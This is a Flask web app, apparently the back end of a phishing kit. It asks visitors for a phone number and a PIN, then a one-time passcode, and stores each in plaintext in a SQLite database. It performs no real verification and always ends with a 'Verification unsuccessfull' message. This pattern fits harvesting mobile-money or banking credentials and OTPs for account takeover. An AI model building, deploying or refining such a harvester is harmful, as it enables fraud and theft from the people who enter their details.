from flask import Flask, render_template, request, redirect, url_for
import sqlite3

app = Flask(__name__)

DB = "database.db"

# Initialize database
def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS verifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            pin TEXT,
            otp TEXT
        )
    """)
    conn.commit()
    conn.close()

# --------------------------
# ROUTES
# --------------------------

# Home page (index.html)
@app.route("/")
def index():
    return render_template("index.html")

# Verify page (phone + PIN)
@app.route("/verify", methods=["GET", "POST"])
def verify():
    if request.method == "POST":
        phone = request.form.get("phone")
        pin_digits = request.form.getlist("pin[]")
        pin = "".join(pin_digits)

        # Store phone + PIN in database
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute(
            "INSERT INTO verifications (phone, pin) VALUES (?, ?)",
            (phone, pin)
        )
        conn.commit()
        conn.close()

        # Redirect to OTP page
        return redirect(url_for("otp_page", phone=phone))

    # GET request → just render verify.html
    return render_template("verify.html")

# OTP page
@app.route("/otp", methods=["GET", "POST"])
def otp_page():
    phone = request.args.get("phone") or request.form.get("phone")
    
    if request.method == "POST":
        otp = request.form.get("otp")
        conn = sqlite3.connect(DB)
        c = conn.cursor()
        # Update OTP for this phone
        c.execute(
            "UPDATE verifications SET otp=? WHERE phone=?",
            (otp, phone)
        )
        conn.commit()
        conn.close()
        return "Verification unsuccessfull."

    return render_template("otp.html", phone=phone)

# --------------------------
# MAIN
# --------------------------
if __name__ == "__main__":
    app.run()
